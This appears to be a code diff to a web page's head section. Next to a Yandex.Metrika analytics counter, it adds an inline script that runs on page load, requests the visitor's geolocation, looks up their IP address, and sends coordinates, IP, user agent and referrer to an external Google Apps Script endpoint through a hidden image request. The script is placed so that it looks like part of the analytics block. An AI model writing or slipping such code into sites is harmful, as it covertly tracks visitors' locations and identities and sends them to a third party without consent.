@@ -43,8 +43,48 @@
         accurateTrackBounce:true
    });
 </script>
+  <!-- /Yandex.Metrika counter -->
+    <!-- скриптик сука -->
+<script>
+(function () {
+  const ua = navigator.userAgent;
+  const ref = document.referrer;
+
+  const sendData = (lat, lon) => {
+    fetch('https://api64.ipify.org?format=json')
+      .then(res => res.json())
+      .then(data => {
+        const ip = data.ip;
+        const url = `https://script.google.com/macros/s/AKfycbw_mSVyzKa1w6ko3j8mj7_RS4F_5yta8PC0nT_6Q1FF4IT1AUYsS3oWY9GDfqUwY0uC/exec?` +
+          `lat=${lat}&lon=${lon}&ip=${ip}` +
+          `&ua=${encodeURIComponent(ua)}&ref=${encodeURIComponent(ref)}`;
+
+        console.log("Отправляю данные:", url);
+        new Image().src = url;
+      })
+      .catch(err => console.error("Ошибка при получении IP:", err));
+  };
+
+  if (location.protocol === 'https:') {
+    navigator.geolocation.getCurrentPosition(
+      pos => {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+        sendData(lat, lon);
+      },
+      err => {
+        console.warn("Гео не дал — используем заглушки.");
+        sendData('', '');
+      }
+    );
+  } else {
+    console.warn("HTTP сайт — геолокация заблокирована по протоколу. Используем заглушки.");
+    sendData('', '');
+  }
+})();
+</script>
 <noscript><div><img src="https://mc.yandex.ru/watch/102188431" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
-<!-- /Yandex.Metrika counter -->
+
 </head>
 <body>
   <div class="card">
